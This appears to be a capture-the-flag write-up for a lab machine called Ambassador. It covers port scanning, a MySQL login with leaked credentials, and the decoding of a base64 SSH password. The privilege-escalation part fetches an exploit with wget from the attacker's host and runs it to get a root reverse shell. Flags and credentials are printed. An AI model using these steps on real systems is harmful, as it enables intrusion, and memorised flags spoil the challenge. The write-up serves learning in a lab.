# Ambassador

Let's stat enumerating the system !
```
sudo nmap -sS --open --min-rate 5000 -Pn -n -v 10.10.11.183 -oG allPorts
```
> Dicovered ports: 22,80,3000,3306

Check the version of services 
```
nmap -sC -sV -p22,80,3000,3306 10.10.11.183 -oN targeted
```

Connect to the mysql !
```
mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306
```

Once there, let's search main info !
```
MySQL [(none)]> show databases;
```

We have these databases !
```
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
```

Let's check ```whackywidget``` database
```
MySQL [grafana]> use whackywidget;
```

Check the tables inside
```
MySQL [whackywidget]> show tables
```

We have the ```users``` table !
```
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
```

So, let's extract the information !
```
MySQL [whackywidget]> select * from users;
```

We have the ```developper``` credentials ! (cf. [file](./content/developer_ssh_credenttials.txt))
```
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

The password seems to be in base64, to decode it run
```
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
```

We got the real password !
```
anEnglishManInNewYork027468
```

Connect to the ssh and enter the password
```
ssh developer@ambassador.htb
```

Once inside, we have the ```user.txt``` flag !
```
a23626b3b7c1add20ab98688bedd5216
```

# TODO finish the git research 


We need to transfer our exploit file to the ambassador machine ! in our local machine create a server in the directory where ```root_pass.py``` is
```
sudo python3 -m http.server 2222
```

In the ssh connexion, run
```
wget http://<YOUR_IP>:2222/root_pass.py
```
> In my personal case :
> ```
> wget http://10.10.16.29:2222/root_pass.py
> ```

Exec the exploit !
```
python3 root_pass.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.16.29 --lport 123 --token  bb03b43b-1d81-d62b-24b5-39540ee469b5
```

We are root in the listener !
```
...
Ncat: Connection from 10.10.11.183.
root@ambassador:/#
```

Let's open the ```root.txt``` !
```
cat /root/root.txt
```

We have the final flag !
```
32320caee8565cff856ea7e5a3715ddf
```
